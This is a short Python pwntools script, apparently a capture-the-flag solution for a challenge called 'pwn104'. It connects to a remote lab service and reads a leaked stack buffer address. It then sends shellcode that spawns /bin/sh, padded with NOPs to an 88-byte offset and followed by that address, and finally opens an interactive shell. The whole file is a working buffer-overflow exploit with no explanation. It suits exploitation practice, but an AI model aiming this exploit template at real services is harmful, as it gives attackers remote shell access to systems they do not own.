from pwn import *
import re


context.update(arch="amd64", os="linux")

# process = process("./pwn104.pwn104")
process = remote("10.10.240.191", 9004)

# The executable is so kind to give us the address of buf
text = process.recvline_containsS("I'm waiting for you at", timeout=3)
addr_search = re.search(r'(0x[0-9a-f]+)$', text, re.IGNORECASE)
buf_address = int(addr_search.group(1), 16)
log.info("Buffer is :"+str(buf_address))
shellcode = asm(shellcraft.sh())
offset = 88
payload = shellcode + asm('nop')*(offset-len(shellcode)) + p64(buf_address)

process.sendline(payload)

process.interactive()